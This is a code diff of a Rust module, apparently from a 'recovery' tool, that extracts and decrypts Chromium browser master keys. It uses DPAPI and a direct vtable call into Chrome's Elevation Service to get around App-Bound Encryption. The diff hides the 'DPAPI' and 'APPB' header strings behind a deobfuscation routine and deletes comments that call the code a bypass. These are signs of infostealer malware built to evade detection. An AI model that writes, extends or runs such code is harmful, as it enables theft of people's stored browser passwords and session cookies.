@@ -1,5 +1,6 @@
 use crate::recovery::browser::browsers::{BrowserName, browser_data_roots};
 use crate::recovery::context::RecoveryContext;
+use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::output::write_json_artifact;
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use aes_gcm::aead::Aead;
@@ -11,17 +12,15 @@ use serde::Serialize;
 use std::ffi::c_void;
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
-use windows::core::{GUID, HSTRING, PCWSTR, HRESULT, Interface};
 use windows::Win32::Foundation::{HLOCAL, LocalFree};
 use windows::Win32::Security::Cryptography::{
     CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
 };
 use windows::Win32::System::Com::{
-    CoCreateInstance, CoInitializeEx, CLSCTX_LOCAL_SERVER, COINIT_MULTITHREADED,
+    CLSCTX_LOCAL_SERVER, COINIT_MULTITHREADED, CoCreateInstance, CoInitializeEx,
 };
+use windows::core::{GUID, HRESULT, HSTRING, Interface, PCWSTR};
 
-// Chrome Elevation Service COM interface for App-Bound Encryption bypass
-// CLSID for IElevator (Google Chrome)
 const CLSID_ELEVATOR: GUID = GUID::from_u128(0x7088E230_021D_4a25_822E_013064E07F16);
 
 pub fn chromium_secrets_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
@@ -121,7 +120,6 @@ pub fn extract_master_key(local_state_path: &Path) -> Result<Option<Vec<u8>>, Re
     let json: serde_json::Value =
         serde_json::from_slice(&data).map_err(|err| RecoveryError::Custom(err.to_string()))?;
 
-    // Check for App-Bound Encryption first (Chrome v120+)
     if let Some(app_bound_key) = json
         .get("os_crypt")
         .and_then(|os| os.get("app_bound_encrypted_key"))
@@ -132,7 +130,6 @@ pub fn extract_master_key(local_state_path: &Path) -> Result<Option<Vec<u8>>, Re
         }
     }
 
-    // Fallback to standard encryption
     if let Some(encrypted_key) = json
         .get("os_crypt")
         .and_then(|os| os.get("encrypted_key"))
@@ -171,7 +168,8 @@ fn decode_chromium_key(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
         .decode(encoded)
         .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;
 
-    if decoded.starts_with(b"DPAPI") {
+    let dpapi_header = deobf(&[0xFA, 0x9D, 0x8C, 0x9D, 0x84]);
+    if decoded.starts_with(dpapi_header.as_bytes()) {
         decoded.drain(0..5);
         dpapi_unprotect(&decoded)
     } else {
@@ -215,23 +213,25 @@ fn decrypt_app_bound(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
         .decode(encoded)
         .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;
 
-    if !decoded.starts_with(b"APPB") {
+    let appb_header = deobf(&[0xFC, 0x9D, 0x9D, 0x8F]);
+    if !decoded.starts_with(appb_header.as_bytes()) {
         return Err(RecoveryError::Custom("invalid app-bound key header".into()));
     }
 
     unsafe {
         let _ = CoInitializeEx(None, COINIT_MULTITHREADED);
-        
-        // Use IUnknown for CoCreateInstance to avoid interface macro issues
-        let elevator: windows::core::IUnknown = CoCreateInstance(&CLSID_ELEVATOR, None, CLSCTX_LOCAL_SERVER)
-            .map_err(|err| RecoveryError::Custom(format!("failed to connect to Chrome Elevation Service: {err}")))?;
+
+        let elevator: windows::core::IUnknown =
+            CoCreateInstance(&CLSID_ELEVATOR, None, CLSCTX_LOCAL_SERVER).map_err(|err| {
+                RecoveryError::Custom(format!(
+                    "failed to connect to Chrome Elevation Service: {err}"
+                ))
+            })?;
 
         let input_hstring = HSTRING::from(encoded);
         let mut decrypted_ptr: *mut u16 = std::ptr::null_mut();
         let mut last_error: u32 = 0;
 
-        // Manual VTable call for DecryptData (offset 4)
-        // 0: QueryInterface, 1: AddRef, 2: Release, 3: RunRecovery, 4: DecryptData
         let vtable = *(elevator.as_raw() as *const *const usize);
         let decrypt_data_ptr = *vtable.add(4);
         let decrypt_data_fn: unsafe extern "system" fn(
@@ -248,10 +248,16 @@ fn decrypt_app_bound(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
             &mut last_error,
         );
 
-        hr.ok().map_err(|err| RecoveryError::Custom(format!("COM DecryptData failed: {err} (last_error: {last_error})")))?;
+        hr.ok().map_err(|err| {
+            RecoveryError::Custom(format!(
+                "COM DecryptData failed: {err} (last_error: {last_error})"
+            ))
+        })?;
 
         if decrypted_ptr.is_null() {
-            return Err(RecoveryError::Custom("decryption returned null pointer".into()));
+            return Err(RecoveryError::Custom(
+                "decryption returned null pointer".into(),
+            ));
         }
 
         let mut len = 0;
@@ -264,14 +270,10 @@ fn decrypt_app_bound(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
         let _ = LocalFree(HLOCAL(decrypted_ptr as *mut c_void));
 
         let master_key_b64 = decrypted_hstring.to_string();
-        
-        // If it's still a Result, we need to handle it properly.
-        // Let's try to assume it's a Result and handle it.
-        // Wait, the error said Result<HSTRING> doesn't implement Display.
-        // That was because I was calling to_string on a Result<HSTRING>.
-        
-        let master_key = STANDARD.decode(&master_key_b64)
-            .map_err(|err| RecoveryError::Custom(format!("base64 decode of decrypted key failed: {err}")))?;
+
+        let master_key = STANDARD.decode(&master_key_b64).map_err(|err| {
+            RecoveryError::Custom(format!("base64 decode of decrypted key failed: {err}"))
+        })?;
 
         Ok(master_key)
     }
